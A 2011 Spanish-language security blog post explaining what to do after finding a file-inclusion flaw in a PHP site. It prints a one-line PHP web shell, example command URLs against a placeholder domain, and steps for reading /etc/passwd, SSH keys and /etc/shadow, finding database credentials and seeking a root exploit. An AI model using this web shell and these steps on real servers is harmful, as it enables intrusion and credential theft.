---
layout: post
title: "[THE BEGINNINGS] RFI/LFI: ¿y ahora qué?"
date: 2011-05-03 10:35:17
categories: [web security, vulnerability]
tags: [rfi, lfi, file inclusion, old]
---


![Bender LFI RFI](img/bender_applause.png)

RFI (Remote File Inclusion) y LFI (Local File Inclusion) son de las vulnerabilidades más altas que nos podemos encontrar en un aplicativo, esto supone poder ejecutar en la aplicación código externo a la misma, ya sea habiendo conseguido subir un fichero malicioso a la misma (LFI) o ejecutando código malicioso en la aplicación alojado en otro servidor (RFI). A continuación no trataremos de enseñar a localizar este tipo de vulnerabilidades, sino de una vez encontradas poder explotarlas de la forma más eficiente posible.

Como hemos dicho anteriormente, no nos interesa saber como conseguimos ejecutar el código, si embebido en una foto, subiendo un archivo o remotamente, sino saber qué hacer después de haberlo conseguido para ello partiremos simplemente de un dominio www.owned.com en el que hemos conseguido subir un fichero con código malicioso (nos da lo mismo la extensión) por sencillez imaginaremos que la ruta del fichero malicioso es `www.owned.com/imag/shell.php`. El fichero shell.php puede contener una shell potente y compleja tipo C99, pero lo que nos interesa es tener claro el concepto por lo que nuestra "shell" contendrá simplemente: `<? system($cmd); ?>` rápidamente podemos ver que simplemente recibe un valor de entrada que recoge la variable cmd y es ejecutado en el sistema mediante la llamada `system` de PHP. Tenemos que tener en cuenta que para poder continuar crearemos un entorno "ideal",en el que PHP no tiene deshabitado la realización de la llamada al sistema `system`. Dicho lo anterior podemos ejecutar comandos en el servidor llamando a nuestro archivo shell.php e indicando el valor de la variable cmd (comando a ejecutar).

Por ejemplo:

`http://www.owned.com/imag/shell.php?cmd=ls`

Nos podría mostrar en pantalla:

`autor.jpg banner.jpg prueba.jpg shell.php`

Los resultados se mostrarían de un forma muy incomodos, y para verlos bien tendríamos que ver el código HTML, una buena solución es realizar un pequeño script, en este caso en perl, para poder ver los resultados más cómodos desde nuestra consola, el script podría ser algo como:

Codigo en perl de nuestra mini-shell:
![shell](http://dan1t0.wordpress.com/wp-content/uploads/2011/04/shell.png)

Tenemos que tener en cuenta que el archivo siempre estará en la misma ruta si no lo movemos, por lo que comandos como `cd` no tendrían mucho sentido en este caso.

Una vez aclarado esto podemos decir que tenemos cierto control sobre la maquina, en este caso tenemos las credenciales del usuario definido para el usuario PHP, si este fuera root cosa bastante improbable, el resto del post no tendría sentido, porque podríamos hacer lo que quisiéramos.

Pasemos a otras posibilidades dentro de la configuración del servidor (entendemos que al ser PHP lo idóneo sería un servidor Apache y un linux por supuesto ;)). Las posibilidades pueden variar, si es un servidor con hosting compartido, es muy raro (sería una cagada) que el usuario de PHP pudiera listar y recorrer toda la maquina, ya que se verían afectados no solo el aplicativo web vulnerable sino el resto de dominios. Para analizar si estamos en un [chroot](http://es.wikipedia.org/wiki/Chroot) podríamos comprobarlo por ejemplo:

Visitando la web [www.robtex.com/](http://www.robtex.com/) y comprobar la ip del servidor "auditado", allí podemos ver si hay más dominios en esa ip, si es así y no estamos en un `chroot` podríamos listar el resto de dominios existentes la carpeta destinada a ello en apache, normalmente `/var/www/html/`. Si por el contrario nos encontramos algo del tipo `/var/www/vhost/` podemos deducir que estamos en un chroot.

* Si ejecutamos `cat /etc/passwd` y vemos cosas anormales, como si estuviera incompleto, cosas incoherentes, pocos usuarios, entonces podemos decir que estamos en un `chroot`.

* Si ejecutamos el comando `d` y vemos que solo aparece un número de usuario, o la información que muestra da signos de ser incompleta o poco previsible seguramente estemos bajo un `chroot`.

* En definitiva, tenemos que investigar y usar un poco la intuición, si ejecutamos `uname -a` y vemos el sistema que corre la maquina podemos intentar buscar archivos que sabemos que tienen que existir en la maquina, si por ejemplo estamos en un Debian podemos buscar el ´/etc/network/interfaces´, si no existe podríamos estar en un chroot, al igual que si hacemos un ´ls /bin/´ y vemos muy pocos comandos.

Llegados a este punto, si no estuvieramos en un chroot podemos intentar ver hasta que punto tenemos permisos para leer ciertos archivos críticos como claves de ssh, la configuración de ssh en ´/etc/ssh/sshd_config´, el archivo ´/etc/passwd´, y todo lo que se nos ocurra. También podemos ver que comandos podemos ejecutar sin ser root, aprovecharnos de comandos sensibles como ´wget´, ´netcat´ o ´curl´ para poder explotar al máximo la vulnerabilidad.

En caso de estar en un ´chroot´ también debemos ver que comandos tenemos habilitados para ejecutar, porque aunque no podamos salir de nuestra "jaula" tendremos habilitados una serie de comandos y quizás por algún despiste del admin tengamos habilitado algún comando sensible que nos pueda interesar para poder seguir "tirando de la cuerda".

En cualquier caso **la meta es conseguir credenciales de root** por lo que debemos de ver la versión de sistema operativo y buscar en paginas como exploitdb.com alguna vulnerabilidad que este sin parchear y poder explotarla mediante algún exploit o cualquier otro método, si lo conseguimos perfecto, hemos owneado la maquina y ya sabéis que un gran poder conlleva una gran responsabilidad, así que sed buenos ;)

**Bola Extra:**

Normalmente un aplicativo basado en PHP va conectado a una BBDD normalmente MySQL, cuando se instala MySQL en la maquina al igual que pasa con apache, el sistema crea un usuario con unos privilegios y podemos intentar usar este usuario para recoger información del sistema o si mysql se ejecuta como root (bastante improbable) podemos leer directamente ficheros muy jugosos como `/etc/shadow`, puede que aun existiendo un `chroot` el usuario de MySQL este fuera del mismo, por alguna razón (aunque esto implique una vulnerabilidad evidente). Llegados a este punto y aprovechando nuestra vulnerabilidad inicial FI (File Inclusion) vamos a subir otro archivo en PHP que use las credenciales del usuario de MySQL para acceder a los recursos del sistema, para ello necesitamos el nombre de la BBDD, el usuario y la contraseña, por suerte para nosotros debido a la lógica de PHP en algún archivo con extensión php del aplicativo se encuentran estos datos, basta con navegar la web y ver sitios clave que se conectan a la BBDD como puede ser alta.php, feed.php, etc; ejecutando el comando `cat`, con nuestra shell, del contenido hasta dar con los que buscamos, una vez hecho un código como este nos valdría para poder mostrar por pantalla archivos del servidor:

MySQL:

![](http://dan1t0.wordpress.com/wp-content/uploads/2011/04/mysql.png)

Sobra decir que si tenemos las credenciales de la BBDD podemos hacer lo que queramos con ella ^_^, aunque ya que estamos no deberíamos contentarnos solo con la base de datos.

Nuestra nueva "shell" la hemos subido en: `http://www.owned.com/imag/shellSQL.php` e indicando el archivo a listar en la variable `link` si este existe nos lo mostrara por pantalla, el formato seria:
`http://www.owned.com/imag/shellSQL.php?file=%2fetc%2fnetwork%2finterfaces`
cabe indicar que la barra es sustituida por su código URL %2f. Podriamos ver algo como esto:

Contenido de un supuesto archivo `/etc/network/interfaces`:
![](http://dan1t0.wordpress.com/wp-content/uploads/2011/04/sql.png)

Podeis obtener mas información de `chroot`[aqui](http://www.securityartwork.es/2011/04/19/chroot/).

También teneis un cheat sheet de MySQL muy útil para estas tareas [aquí](http://pentestmonkey.net/blog/mysql-sql-injection-cheat-sheet/).

Como veis entre este post y el anterior hay una gran distancia, tanto técnica como de tiempo, espero poder volver a escribir con la frecuencia que me gustaría y no dejar esto tan sumamente abandonado.
